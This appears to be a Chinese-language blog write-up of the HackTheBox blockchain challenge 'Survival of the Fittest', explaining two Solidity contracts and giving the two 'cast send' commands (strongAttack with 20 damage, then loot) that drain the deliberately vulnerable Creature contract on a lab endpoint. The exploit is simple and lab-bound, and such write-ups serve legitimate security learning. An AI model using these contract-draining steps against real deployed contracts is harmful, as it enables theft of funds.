{
  "id": 1760067302800,
  "title": "HackTheBox Survival of the Fittest",
  "slug": "htb-survival-of-the-fittest",
  "date": "2025-03-03",
  "isEncrypted": false,
  "html": "<p><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36086461/1733072889086-ea5c0fc9-ecd3-4e0d-896a-1e3694fd27bb.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36086461/1733072933494-f4b72879-3b73-491d-a889-f25ee69ca486.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36086461/1733072913148-47dbd29f-ace3-4d8f-b375-bd54c97c7efa.png\" alt=\"\"></p>\n<p>分析一下附件</p>\n<p>Setup.sol</p>\n<p><code>Setup</code> 合约旨在部署初始余额为 10 个以太币的 <code>Creature</code> 合约。部署时需要 1 个以太币存款。该合约包括一个 <code>isSolve</code> 函数，用于检查 <code>Creature</code> 合约的余额是否已耗尽为零。这种设置意味着目标是利用 <code>Creature</code> 合约来清空其余额，从而解决挑战</p>\n<pre><code class=\"language-solidity\">// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\nimport {Creature} from &quot;./Creature.sol&quot;;\n\ncontract Setup {\n  Creature public immutable TARGET;\n\n  constructor() payable {\n    require(msg.value == 1 ether);\n    TARGET = new Creature{value: 10}();\n  }\n\n  function isSolved() public view returns (bool) {\n    return address(TARGET).balance == 0;\n  }\n}\n\n</code></pre>\n<p>Creature.sol</p>\n<p><code>Creature</code> 合约代表一个简单的实体，具有生命值系统和转移其余额的机制。它开始时有 20 点生命值，可以通过 <code>strongAttack</code> 和 <code>punch</code> 功能进行攻击以减少其生命值。合约跟踪 <code>aggro</code> 变量中与其交互的最后一个地址。当生物的生命值降至零时，<code>loot</code>功能允许任何人提取合同的全部余额</p>\n<pre><code class=\"language-solidity\">// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\ncontract Creature {\n\n  uint256 public lifePoints;\n  address public aggro;\n\n  constructor() payable {\n    lifePoints = 20;\n  }\n\n  function strongAttack(uint256 _damage) external{\n    _dealDamage(_damage);\n  }\n\n  function punch() external {\n    _dealDamage(1);\n  }\n\n  function loot() external {\n    require(lifePoints == 0, &quot;Creature is still alive!&quot;);\n    payable(msg.sender).transfer(address(this).balance);\n  }\n\n  function _dealDamage(uint256 _damage) internal {\n    aggro = msg.sender;\n    lifePoints -= _damage;\n  }\n}\n</code></pre>\n<pre><code class=\"language-powershell\">cast send 0x0a9e61Ae68eb338f15e83daD97E136F7121fD473 &quot;strongAttack(uint256)&quot; 20 --rpc-url http://94.237.53.117:44065/rpc --interactive\n\ncast send 0x0a9e61Ae68eb338f15e83daD97E136F7121fD473 &quot;loot()&quot; --rpc-url http://94.237.53.117:44065/rpc --interactive\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36086461/1733071219127-d1718d4a-52cd-485b-94a4-324030a52260.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36086461/1733072112338-00cf5f68-de1c-4c7d-ab96-93772f918161.png\" alt=\"\"></p>\n<p>访问 <a href=\"http://94.237.53.117:44065/flag\">http://94.237.53.117:44065/flag</a></p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36086461/1733072209207-7884e456-eefe-49a8-8f48-9edc1cf45195.png\" alt=\"\"></p>\n"
}